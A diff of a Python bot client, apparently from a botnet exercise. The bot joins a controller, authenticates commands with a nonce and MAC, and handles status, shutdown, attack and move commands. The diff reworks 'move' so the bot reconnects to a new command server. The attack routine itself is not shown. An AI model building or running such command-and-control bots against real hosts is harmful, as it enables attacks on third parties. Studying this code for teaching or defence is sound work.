@@ -65,25 +65,10 @@ def execute_attack_cmd(hostname, port, nick, nonce, sock):
     return True
 
 def execute_move_cmd(hostname, port, nick, sock, secret):
-    msg = f'-move {nick}'
+    msg = f'-move {nick}\n'
     sock.sendall(msg.encode())
     sock.close()
-    connected = False
-    # connect to new server
-    while(not connected): 
-        try:
-            sock = socket.create_connection((hostname,port), timeout=30)
-            print("Connected")
-            join_msg = f'-joined {nick}\n'
-            sock.sendall(join_msg.encode())
-            connected = True
-            # <nonce> <mac> <command> <argument1> <argument2>
-        except socket.timeout:
-            print("Connection timed out. Attempting to reconnect...")
-        except Exception as e:
-            print(e)
-        time.sleep(5)
-    return True
+    return True, [hostname, port]
     
 
 def execute_cmd(msg, nick, sock, num_cmds_executed, secret):
@@ -93,7 +78,7 @@ def execute_cmd(msg, nick, sock, num_cmds_executed, secret):
             msg = f'-status {nick} {num_cmds_executed + 1}\n'
             sock.sendall(msg.encode())
             print("status sent")
-            return True
+            return True, []
         case "shutdown":
             msg = f'-shutdown {nick}\n'
             print("shutting down...")
@@ -104,25 +89,25 @@ def execute_cmd(msg, nick, sock, num_cmds_executed, secret):
         case "attack":
             if (len(msg) <= 3):
                 print("invalid number of args. <hotname>:<port> expected")
-                return False
+                return False, []
             hostname, port = msg[3].split(':')
-            return execute_attack_cmd(hostname, port, nick, msg[0], sock)
+            return execute_attack_cmd(hostname, port, nick, msg[0], sock), []
         case "move":
             if (len(msg) <= 3):
                 print("invalid number of args. <hotname>:<port> expected")
-                return False
+                return False, []
             hostname, port = msg[3].split(':')
             return execute_move_cmd(hostname, port, nick, sock, secret)
         case _:
             print("command not recognized")
-            return False
+            return False, []
 
 def start_bot(hostname, port, nick, secret):
     num_cmds_executed = 0
     while(True): 
         try:
             sock = socket.create_connection((hostname,port), timeout=30)
-            print("Connected")
+            print("Connected to", hostname, port)
             join_msg = f'-joined {nick}\n'
             sock.sendall(join_msg.encode())
             # <nonce> <mac> <command> <argument1> <argument2>
@@ -131,9 +116,13 @@ def start_bot(hostname, port, nick, secret):
                 print(f"received: {msg}")
                 if len(msg) >= 3 and authenticate_cmd(msg[0], msg[1], secret):
                     print(f'executing {msg[2]} command...')
-                    res = execute_cmd(msg, nick, sock, num_cmds_executed, secret)
+                    res, args = execute_cmd(msg, nick, sock, num_cmds_executed, secret)
                     if res:
                         num_cmds_executed += 1
+                        if len(args) > 0:
+                            print("args", args)
+                            hostname, port = args
+                            print("hostname and port: ", hostname, port)
                 else:
                     print('message ignored')
         except socket.timeout:
@@ -144,7 +133,6 @@ def start_bot(hostname, port, nick, secret):
 
 
         
-sock = ''
 seen_nonces = []
 
 
